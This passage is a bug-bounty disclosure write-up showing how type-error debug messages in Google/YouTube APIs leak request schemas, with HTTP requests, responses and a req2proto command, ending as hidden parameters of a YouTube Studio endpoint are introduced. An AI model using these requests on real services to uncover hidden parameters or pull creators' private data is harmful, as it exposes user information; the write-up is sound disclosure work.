---
title: Disclosing YouTube Creator Emails for a $20k Bounty
url: https://brutecat.com/articles/youtube-creator-emails
source: Over Security - Cybersecurity news aggregator
date: 2025-07-02
fetch_date: 2025-10-06T23:56:01.621543
---

# Disclosing YouTube Creator Emails for a $20k Bounty

[< Back](/)

[< Back](/)

## Disclosing YouTube Creator Emails for a $20k Bounty

2025-03-13

![](/assets/youtube-creator-emails.jpg)

Some time back, while playing around with Google API requests, I found out it was possible to [leak all request parameters in any Google API endpoint.](/articles/decoding-google#leaking-request-parameters-through-error-messages) This was possible because for whatever reason, sending a request with a wrong parameter type returned debug information about that parameter:

‎
**Request**

```
POST /youtubei/v1/browse HTTP/2
Host: youtubei.googleapis.com
Content-Type: application/json
Content-Length: 164

{
  "context": {
    "client": {
      "clientName": "WEB",
      "clientVersion": "2.20241101.01.00",
    }
  },
  "browseId": 1
}
```

> The server actually expects `browseId` to be a string like `"UCX6OQ3DkcsbYNE6H8uQQuVA"`

‎

**Response**

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "error": {
    "code": 400,
    "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
    "errors": [
      {
        "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
        "reason": "invalid"
      }
    ],
    "status": "INVALID_ARGUMENT",
    ...
  }
}
```

While YouTube's API normally uses JSON requests for web, it actually also supports another format called ProtoJson aka `application/json+protobuf`

‎
This allows us to specify parameter values in an array, rather than with the parameter name as we would in JSON. We can abuse this logic to provide the wrong parameter type for all parameters without even knowing its name, leaking information about the entire possible request payload.

‎
**Request**

```
POST /youtubei/v1/browse HTTP/2
Host: youtubei.googleapis.com
Content-Type: application/json+protobuf
Content-Length: 22

[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
```

**Response**

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "error": {
    "code": 400,
    "message": "Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\nInvalid value at 'browse_id' (TYPE_STRING), 2\nInvalid value at 'params' (TYPE_STRING), 3\nInvalid value at 'continuation' (TYPE_STRING), 7\nInvalid value at 'force_ad_format' (TYPE_STRING), 8\nInvalid value at 'player_request' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.PlayerRequest), 10\nInvalid value at 'query' (TYPE_STRING), 11\nInvalid value at 'has_external_ad_vars' (TYPE_BOOL), 12\nInvalid value at 'force_ad_parameters' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ForceAdParameters), 13\nInvalid value at 'previous_ad_information' (TYPE_STRING), 14\nInvalid value at 'offline' (TYPE_BOOL), 15\nInvalid value at 'unplugged_sort_filter_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedSortFilterOptions), 16\nInvalid value at 'offline_mode_forced' (TYPE_BOOL), 17\nInvalid value at 'form_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseFormData), 18\nInvalid value at 'suggest_stats' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.SearchboxStats), 19\nInvalid value at 'lite_client_request_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.LiteClientRequestData), 20\nInvalid value at 'unplugged_browse_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedBrowseOptions), 22\nInvalid value at 'consistency_token' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ConsistencyToken), 23\nInvalid value at 'intended_deeplink' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DeeplinkData), 24\nInvalid value at 'android_extended_permissions' (TYPE_BOOL), 25\nInvalid value at 'browse_notification_params' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseNotificationsParams), 26\nInvalid value at 'recent_user_event_infos' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.RecentUserEventInfo), 28\nInvalid value at 'detected_activity_info' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DetectedActivityInfo), 30",
    ...
}
```

To automate this process, I wrote a tool called [req2proto](https://github.com/ddd/googleapi_tools).

```
$ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3
```

If we look at the output at `output/youtube/api/pfiinnertube/message.proto`, we can see the full request payload for this endpoint:

```
syntax = "proto3";

package youtube.api.pfiinnertube;

message GetBrowseRequest {
  InnerTubeContext context = 1;
  string browse_id = 2;
  string params = 3;
  string continuation = 7;
  string force_ad_format = 8;
  int32 debug_level = 9;
  PlayerRequest player_request = 10;
  string query = 11;
  ...
}
...
```

Equipped with this, I started looking around to find any API endpoints with secret parameters that might allow us to leak debug information.

### A seemingly secure endpoint

If you ever looked around at the requests sent by [YouTube Studio](https://studio.youtube.com) to load the "Earn" tab, you might have noticed the following request:
‎
![](/assets/youtube-creator-emails/earn_tab.png)
‎

```
POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
Host: studio.youtube.com
Content-Type: application/json
Cookie: <redacted>

{
  "context": {
    ...
  },
  "channelIds": [
    "UCeGCG8SYUIgFO13NyOe6reQ"
  ],
  "mask": {
    "channelId": true,
    "monetizationStatus": true,
    "monetizationDetails": {
      "all": true
    },
    ...
  }
}
```

It's used for fetching our own channel data that's displayed on the Earn tab. That being said, it's actually possible to fetch other channel's metadata with this, albeit with extremely few masks:
‎
**Request**

```
POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
Host: studio.youtube.com
Content-Type: application/json
Cookie: <redacted>

{
  "context": {
    ...
  },
  "channelIds": [
    "UCdcUmdOxMrhRjKMw-BX19AA"
  ],
  "mask": {
    "channelId": true,
    "title": true,
    "thumbnailDetails": {
      "all": true
    },
    "metric": {
      "all": true
    },
    "timeCreatedSeconds": true,
    "isNameVerified": true,
    "channelHandle": true
  }
}
```

**Response**

```
HTTP/2 200 OK
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "channels": [
    {
      "channelId": "UCdcUmdOxMrhRjKMw-BX19AA",
      "title": "Niko Omilana",
      ...
      "metric": {
        "subscriberCount": "7700000",
        "videoCount": "142",
        "totalVideoViewCount": "650836435"
      },
      "timeCreatedSeconds": "1308700645",
      "isNameVerified": true,
      "channelHandle": "@Niko",
    }
  ]
}
```

The masks seemed quite secure. If we tried requesting any other mask that could be sensitive for a channel we don't have access to, we'd be hit with a Permission denied error:

```
{
  "error": {
    "code": 403,
    "message": "The caller does not have permission",
    "errors": [
      {
        "message": "The caller does not have permission",
        "domain": "global",
        "reason": "forbidden"
      }
    ],
    "status": "PERMISSION_DENIED"
  }
}
```

### Leaking secret hidden parameters

As it turns out, if we dump the request payload for this endpoint with [req2proto](https://github.com/ddd/googleapi_tools), we can see there's actually 2 secret hidden parameters:

```
syntax = "proto3";

package youtube.api.pfiinnertube;

message GetCreatorChannelsRequest {
  InnerTubeContext context = 1;
  string channel_ids = 2;
  CreatorChannelMask mask = 4;
  DelegationContext delegation_context = 5;
  bool critical_read = 6; // ???
  bool include_suspended = 7; // ???
}
```

Enabling `criticalRead` didn't seem to chan...